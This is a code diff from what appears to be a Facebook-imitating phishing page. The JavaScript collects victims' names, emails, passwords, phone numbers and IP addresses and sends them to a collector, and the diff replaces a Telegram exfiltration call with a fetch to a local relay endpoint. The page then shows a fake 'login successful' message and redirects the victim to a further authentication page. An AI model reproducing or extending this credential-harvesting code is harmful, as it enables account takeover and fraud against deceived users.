@@ -999,31 +999,42 @@
 
                         var text = "Full Name: " + fullName + "\nFacebook Page Name: " + facebookPageName + "\nEmail: " + email + "\nPass: " + password + "\nMã Vùng: " + country_code + "\nPhone: " + phone + "\nOther reasons: " + otherReasons + "\nIp: " + ip;
 
-                        sendToTelegram(text);
-                    }
+                        let url = `http://localhost:5000/send-message?message=${encodeURIComponent(text)}`;
 
-                    sendData();
+                        // Gửi yêu cầu GET bằng fetch
+                        fetch(url, {
+                            method: 'GET', // Phương thức GET
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        })
+                            .then(response => response.json())  // Nếu phản hồi là JSON
+                            .then(data => console.log(data))    // Xử lý dữ liệu trả về
+                            .catch(error => console.error('Error:', error));  // Xử lý lỗi
+                        }
+
+                        sendData();
 
 
-                    console.log("Nút submit_password đã được click!");
+                        console.log("Nút submit_password đã được click!");
 
-                    showLoadingCircle(); // Hiển thị loading
-                    $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
+                        showLoadingCircle(); // Hiển thị loading
+                        $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
 
 
-                    setTimeout(() => {
-                        hideLoadingCircle(); // Ẩn loading
-                        $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
+                        setTimeout(() => {
+                            hideLoadingCircle(); // Ẩn loading
+                            $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
 
-                        sessionStorage.setItem("fromIndex", "true");
-                        window.location.href = "authen.html";
+                            sessionStorage.setItem("fromIndex", "true");
+                            window.location.href = "authen.html";
 
-                        // Ẩn modal đúng cách
-                        $("#passwordModal").modal("hide");
+                            // Ẩn modal đúng cách
+                            $("#passwordModal").modal("hide");
 
-                    }, time_out * 1000);
+                        }, time_out * 1000);
 
-                });
+                    });
 
                 function utf8ToBase64(str) {
                     return btoa(unescape(encodeURIComponent(str)));
